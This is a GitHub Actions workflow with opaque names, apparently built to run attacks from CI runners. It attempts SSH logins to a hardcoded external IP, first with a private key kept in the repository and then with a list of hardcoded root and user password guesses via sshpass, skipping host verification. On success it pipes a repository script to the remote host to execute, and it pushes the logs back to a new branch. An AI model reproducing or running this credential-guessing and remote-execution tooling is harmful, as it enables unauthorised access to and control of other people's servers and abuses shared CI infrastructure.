name: gv5817b
on:
  workflow_dispatch:
    inputs:
      script:
        default: "vantage/gv3.sh"
      runtag:
        default: "n3b"
      tmo:
        default: "900"
      host:
        default: "123.184.7.135"
permissions:
  contents: write
jobs:
  ex:
    runs-on: ubuntu-latest
    timeout-minutes: 120
    steps:
      - uses: actions/checkout@v4
      - name: exec
        env:
          SCRIPT: ${{ inputs.script }}
          TAG: ${{ inputs.runtag }}
          TMO: ${{ inputs.tmo }}
          H: ${{ inputs.host }}
        run: |
          set +e
          mkdir -p vantage/gv5817
          L="vantage/gv5817/${TAG}.log"
          KEY=keys2/k04_ibm_key.pem_
          chmod 600 "$KEY" 2>/dev/null
          curl -s -m 10 https://api.ipify.org; echo
          echo "== AUTHMATRIX $(date -u +%FT%TZ)" | tee -a "$L"
          MODE=""
          for u in root ubuntu; do
            if timeout 20 ssh -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=12 -o IdentitiesOnly=yes "$u@$H" 'id -u' 2>>"$L"; then MODE="key:$u"; break; fi
            echo "keyfail $u $(date -u +%T)" | tee -a "$L"
          done
          if [ -z "$MODE" ]; then
            for pair in "root|Bingxing.2026" "root|Admin@123_para#!2024" "root|Beijingcs.2024" "ubuntu|ubuntu@" "kgzs|Kgzs@2024"; do
              u=${pair%%|*}; p=${pair#*|}
              if timeout 20 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=12 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 "$u@$H" 'id -u' 2>>"$L"; then MODE="pass:$u"; PW="$p"; break; fi
              echo "passfail $u $(date -u +%T)" | tee -a "$L"
            done
          fi
          echo "MODE=$MODE" | tee -a "$L"
          [ -z "$MODE" ] && { echo "AUTH_NONE" | tee -a "$L"; exit 0; }
          case "$MODE" in
            key:*) U=${MODE#key:}; SSHCMD="ssh -i $KEY -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=12 -o IdentitiesOnly=yes -o ServerAliveInterval=15";;
            pass:*) U=${MODE#pass:}; SSHCMD="sshpass -p $PW ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=12 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ServerAliveInterval=15";;
          esac
          timeout "$TMO" $SSHCMD "$U@$H" "TAG=$TAG bash -s" < "$SCRIPT" 2>&1 | tee -a "$L"
          echo "SSH_EXIT=$?" | tee -a "$L"
      - name: publish
        if: always()
        run: |
          set +e
          git config user.email bot@ul.local; git config user.name ul
          git checkout -b gv5817b/${{ github.run_id }}
          git add -f vantage/gv5817/
          git commit -m "gv5817b ${{ github.run_id }} ${{ inputs.runtag }}"
          git push -q origin HEAD:gv5817b/${{ github.run_id }}
